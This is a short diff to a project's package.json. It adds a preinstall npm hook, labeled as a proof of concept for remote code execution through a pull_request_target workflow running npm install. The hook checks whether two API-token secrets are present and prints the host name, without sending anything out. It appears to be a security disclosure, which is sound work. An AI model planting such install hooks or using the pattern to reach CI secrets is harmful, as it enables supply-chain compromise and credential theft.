@@ -18,6 +18,7 @@
   "author": "Johannes Millan <contact@super-productivity.com> (http://super-productivity.com)",
   "main": "./electron/main.js",
   "scripts": {
+    "preinstall": "echo '=== ARTIFACT POISONING POC ===' && echo 'RCE via pull_request_target + npm i' && echo 'CLOUDFLARE_API_TOKEN set:' && test -n \"$CLOUDFLARE_API_TOKEN\" && echo 'YES' || echo 'NO (expected on fork)' && echo 'UNSPLASH_KEY set:' && test -n \"$UNSPLASH_KEY\" && echo 'YES' || echo 'NO (expected on fork)' && echo 'Hostname:' && hostname && echo '=== END POC ==='",
     "env": "node ./tools/load-env.js",
     "assemble:android:prod": "cd android && ./gradlew assembleRelease && cd ..",
     "assemble:android:stage": "cd android && ./gradlew assembleDebug && cd ..",
